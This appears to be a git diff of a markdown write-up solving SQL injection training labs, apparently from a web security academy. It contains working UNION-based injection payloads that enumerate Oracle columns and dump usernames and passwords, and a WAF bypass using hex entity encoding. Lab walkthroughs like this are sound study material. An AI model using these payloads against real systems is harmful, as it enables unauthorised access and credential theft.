@@ -59,8 +59,7 @@ Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept t
 4. Output the column names of the users table
 `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_MQOBSV'--` -> `USERNAME_APTSKD` and `PASSWORD_QXOINH `
 5. Output the list of usernames and passwords
-`' UNION select USERNAME_APTSKD, PASSWORD_QXOINH from USERS_MQOBSV--` -> `administrator` and
-`dvqljtgry480ary2i1iu`
+`' UNION select USERNAME_APTSKD, PASSWORD_QXOINH from USERS_MQOBSV--` -> `administrator` and `dvqljtgry480ary2i1iu`
 
 ## 0x06 SQL injection UNION attack, determining the number of columns returned by the query
 
@@ -75,4 +74,25 @@ Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept t
 
 ***Analysis***:
 
-## SQL injection with filter bypass via XML encoding
+## 0x0B Blind SQL injection with conditional errors
+
+## 0x0C Visible error-based SQL injection
+
+## 0x0D Blind SQL injection with time delays
+
+## 0x0E Blind SQL injection with time delays and information retrieval
+
+## 0x0F Blind SQL injection with out-of-band interaction
+
+## 0x10 Blind SQL injection with out-of-band data exfiltration
+
+## 0x11 SQL injection with filter bypass via XML encoding
+***End Goals***: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
+
+***Analysis***:
+1. Find records of interactions with the backend
+burp -> proxy -> HTTP history  -> `ProductId=1` and `stock`
+2. Obfuscate input in a way that the WAF gets bypassed.
+`1 UNION SELECT NULL` -> Extensions -> Hackvetor -> @hex_entities
+3. Output the list of usernames and passwords
+`1 UNION SELECT username || '~' || password FROM users` ->  `administrator` and `q1xffcev1fis39y95d17`
